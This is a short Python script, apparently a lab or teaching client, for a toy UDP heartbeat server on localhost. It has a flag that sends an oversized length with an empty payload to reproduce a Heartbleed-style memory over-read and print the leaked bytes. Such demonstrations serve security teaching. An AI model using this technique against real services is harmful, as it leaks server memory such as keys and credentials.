import socket
import sys

def Main():
    addr = ("127.0.0.1", 4000)

    if(len(sys.argv) > 2):
        print("Invalid number of arguments")
        usage()
        return
    elif(len(sys.argv) == 2):
        if(sys.argv[1] != "--enable-exploit"):
            print("Invalid argument")
            usage()
            return
        # Attempt heartbleed => max message length (32000 - header length)
        else:
            msg_len = 31995
    # Regular heartbeat
    else:
        msg_len = 4
    try:
        sock = socket.socket(family = socket.AF_INET, type = socket.SOCK_DGRAM)
        sock.settimeout(5)
    except socket.error as err1:
        print("Error while creating Socket: %s, exiting...", err1)
        exit(0)
    msg = b'h'
    msg += msg_len.to_bytes(4, "little")
    # No message if heartbleed
    if(msg_len == 4):
        msg += b'Ping'
    sock.sendto(msg, addr)
    try:
        resp = sock.recv(msg_len + 5)
        # print received message without header
        print(resp[4:].decode())
    except socket.timeout as err2:
        print("%s, exiting..." % err2)
    sock.close()

def usage():
    print("Usage: python3.6 heartbeat_client.py [--enable-exploit]")

if __name__ == "__main__":
    Main()
